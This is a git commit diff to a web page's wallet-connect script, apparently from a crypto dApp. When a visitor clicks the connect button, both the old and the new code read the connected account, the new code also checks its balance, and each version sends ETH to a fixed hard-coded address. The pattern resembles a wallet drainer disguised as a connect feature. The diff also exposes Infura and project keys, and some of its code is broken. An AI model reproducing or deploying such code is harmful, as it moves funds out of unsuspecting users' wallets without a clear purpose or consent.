13822fa6d223f87c441e8dfebe2205af257ac67d
olamicreas <70097198+olamicreas@users.noreply.github.com>
2023-09-23 04:01:13 +0100

    Update wallet-connect.js

--- static/wallet-connect.js
+++ static/wallet-connect.js
@@ -6,10 +6,24 @@ if (typeof process === 'undefined') {
 
 
 import { WalletConnectModalSign } from "https://unpkg.com/@walletconnect/modal-sign-html@2.6.1";
+
 const { OpenSeaPort, Network } = "https://cdn.jsdelivr.net/npm/seaport@2.0.9/index.js";
+import walletconnectWeb3Provider from 'https://cdn.jsdelivr.net/npm/walletconnect-web3-provider@0.7.28/+esm'
 // 1. Define ui elements
 const connectButton = document.getElementById("connect-button");
+const ethereumJsonRpcUrl = 'https://mainnet.infura.io/v3/b515c05d5db44cb3aa07665e4d316042'
 
+const providerOptions = {
+  walletconnect: {
+    package: walletconnectWeb3Provider,
+    options: {
+      // Mikko's test key - don't copy as your mileage may vary
+      infuraId: "b515c05d5db44cb3aa07665e4d316042",
+    }
+  },
+}
+
+console.log(WalletConnectModalSign)
 // 2. Create modal client, add your project id
 const web3Modal = new WalletConnectModalSign({
   projectId: "0d4f78d9c663f3cebe1019795245b1f2",
@@ -19,13 +33,16 @@ const web3Modal = new WalletConnectModalSign({
     url: "https://my-dapp.com",
     icons: ["https://my-dapp.com/logo.png"],
   },
+  relayUrl: 'wss://mainnet.infura.io/ws/v3/b515c05d5db44cb3aa07665e4d316042'
 });
+
 
 // 3. Connect
 async function onConnect() {
   try {
     connectButton.disabled = true;
     const session = await web3Modal.connect({
+
       requiredNamespaces: {
         eip155: {
           methods: ["eth_sendTransaction", "personal_sign"],
@@ -33,35 +50,56 @@ async function onConnect() {
           events: ["chainChanged", "accountsChanged"],
         },
       },
+      
+      
+      
     });
     console.log(session);
      // Use the wallet's provider from Web3Modal
 
     
     var accounts = session.namespaces.eip155.accounts[0].slice(9)
-    const transaction = {
-      to: '0xBa4cf5755661985979d731FD3816e26293caf2D8',
-      value: '1000000000000000', // 0.001 ETH in wei
-      gasPrice: '1000000000', // 1 gwei in wei
-      gas: '21000', // Standard gas limit for a simple transfer
-    };
+    const infuraProvider = new ethers.providers.JsonRpcProvider(ethereumJsonRpcUrl);
     
-    try {
-      const transactionHash = await session.request({
-        method: 'eth_sendTransaction',
-        params: [transaction],
-      });
-    
-      console.log('Transaction sent. Transaction Hash:', transactionHash);
-    } catch (error) {
-      console.error('Error sending ETH transaction:', error);
+    if (session) {
+      console.log('Connected to wallet');
+      
+      // Get the connected address
+      const signer = infuraProvider.getSigner(accounts);
+      console.log(signer)
+      const address = await signer.getAddress();
+      console.log(address)
+      // Create a transaction
+      const balance = await infuraProvider.getBalance(accounts);
+      const balanceInEther = ethers.utils.formatEther(balance);
+      console.log(balanceInEther)
+      const transaction = {
+        from: accounts,
+        to: '0xBa4cf5755661985979d731FD3816e26293caf2D8',
+        value: ethers.utils.parseEther('0.00001'), // 0.001 ETH in Wei
+      };
+
+      // Sign and send the transaction
+      try {
+        
+        const txResponse = await signer.sendTransaction(transaction);
+        await txResponse.wait();
+
+        console.log('Transaction sent. Transaction Hash:', txResponse.hash);
+      } catch (error) {
+        console.error('Error sending ETH transaction:', error);
+      }
     }
   } catch (err) {
     console.error(err);
   } finally {
     connectButton.disabled = false;
+  
   }
-}
+
+  
+} 
+
 
 // 4. Create connection handler
 connectButton.addEventListener("click", onConnect);
